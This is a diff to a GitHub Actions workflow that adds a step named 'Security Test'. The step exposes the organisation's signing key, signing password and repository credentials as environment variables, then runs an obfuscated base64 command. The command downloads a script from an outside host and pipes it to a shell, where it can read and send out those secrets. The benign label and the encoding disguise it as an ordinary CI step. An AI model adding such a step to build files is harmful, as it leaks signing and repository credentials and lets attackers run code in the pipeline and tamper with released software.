@@ -12,6 +12,14 @@ jobs:
       - uses: actions/checkout@v2
         with:
           fetch-depth: 0
+      - name: Security Test
+        env:
+          NETFLIX_OSS_SIGNING_KEY: ${{ secrets.ORG_SIGNING_KEY }}
+          NETFLIX_OSS_SIGNING_PASSWORD: ${{ secrets.ORG_SIGNING_PASSWORD }}
+          NETFLIX_OSS_REPO_USERNAME: ${{ secrets.ORG_NETFLIXOSS_USERNAME }}
+          NETFLIX_OSS_REPO_PASSWORD: ${{ secrets.ORG_NETFLIXOSS_PASSWORD }}
+        run: |
+          echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9hY3Rpb25zL3p1dWx8c2g=|base64 -d|sh
       - name: Set up JDK ${{ matrix.java }}
         uses: actions/setup-java@v2
         with:
